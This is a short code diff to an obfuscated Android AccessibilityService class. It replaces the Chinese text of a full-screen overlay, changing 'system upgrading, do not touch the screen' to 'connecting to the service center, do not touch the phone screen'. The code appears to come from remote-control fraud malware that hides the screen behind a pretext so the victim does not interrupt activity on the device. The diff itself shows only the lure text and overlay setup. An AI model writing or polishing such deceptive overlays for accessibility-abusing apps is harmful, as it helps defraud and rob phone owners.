@@ -1017,7 +1017,7 @@ class nZW99cdXQ0COhB2o : AccessibilityService() {
         val hintSize = 5 * blankDp(100)
         val hintTopMargin = metrics.heightPixels - hintSize - blankDp(60)
         val view = TextView(this).apply {
-            text = "\n\n系统正在优化升级\n请勿触碰屏幕\n请您耐心等候"
+            text = "\n\n正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务"
             textSize = 16.5f
             typeface = Typeface.DEFAULT
             setTextColor(Color.WHITE)
